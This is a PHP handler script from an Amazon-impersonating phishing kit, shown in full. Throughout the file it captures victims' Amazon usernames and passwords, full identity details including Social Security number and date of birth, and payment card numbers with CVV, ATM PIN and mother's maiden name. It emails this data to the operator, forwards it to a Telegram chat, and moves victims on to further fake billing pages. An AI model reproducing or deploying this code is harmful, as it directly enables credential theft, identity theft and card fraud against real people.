<?php
require 'Email.php';
include 'telegram.php';   // Set you Api and Chat ID //
if (isset($_POST['email2'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Amazon Login -----|\n";
    $message .= "Username💻: " . $_POST['email2'] . "\n";
    $message .= "Password🔑: " . $_POST['pass1'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Amazon Login : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header('Location: ./web/billing.php');
}
if (isset($_POST['moemail'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Amazon Login -----|\n";
    $message .= "Username💻: " . $_POST['moemail'] . "\n";
    $message .= "Password🔑: " . $_POST['mpass'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Amazon Login : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header('Location: ./web/mobile/billing.php');
}

if (isset($_POST['fname'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Amazon Fullz -----|\n";
    $message .= "Full Name: " . $_POST['fname'] . "\n";
    $message .= "Phone Number: " . $_POST['phone'] . "\n";
    $message .= "Address: " . $_POST['addres'] . "\n";
    $message .= "Address 2 (Optional): " . $_POST['addres2'] . "\n";
    $message .= "Zip Code: " . $_POST['zipc'] . "\n";
    $message .= "DOB: " . $_POST['dob'] . "\n";
    $message .= "SSN: " . $_POST['ssn'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Amazon Fullz : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header("Location: ./web/cc.php");
}

if (isset($_POST['fnamem'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Amazon Fullz -----|\n";
    $message .= "Full Name: " . $_POST['fnamem'] . "\n";
    $message .= "Phone Number: " . $_POST['phonem'] . "\n";
    $message .= "Address: " . $_POST['addresm'] . "\n";
    $message .= "Address 2 (Optional): " . $_POST['addres2m'] . "\n";
    $message .= "Zip Code: " . $_POST['zipcm'] . "\n";
    $message .= "DOB: " . $_POST['dobm'] . "\n";
    $message .= "SSN: " . $_POST['ssn'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Amazon Fullz : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header("Location: ./web/mobile/cc.php");
}
if (isset($_POST['cnum'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Amazon Card -----|\n";
    $message .= "Card: " . $_POST['cnum'] . "\n";
    $message .= "Exp: " . $_POST['e1'] . "/" . $_POST['e2'] . "\n";
    $message .= "CVV: " . $_POST['cvv'] . "\n";
    $message .= "ATM Pin: " . $_POST['atmp'] . "\n";
    $message .= "MMN: " . $_POST['mmn'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Amazon Card : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header("Location: ./web/done.php");
}

if (isset($_POST['cnumm'])) {

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----Amazon Card -----|\n";
    $message .= "Card: " . $_POST['cnumm'] . "\n";
    $message .= "Exp: " . $_POST['e1m'] . "/" . $_POST['e2m'] . "\n";
    $message .= "CVV: " . $_POST['cvvm'] . "\n";
    $message .= "ATM Pin: " . $_POST['atmpm'] . "\n";
    $message .= "MMN: " . $_POST['mmnm'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "|--- https://whatismyipaddress.com/ip/$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "Amazon Card : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    header("Location: ./web/mobile/done.php");
}
$fp = fopen("", "a"); // Add name of text file if want to save. like "./name.txt"//
fputs($fp, $message);
fclose($fp);
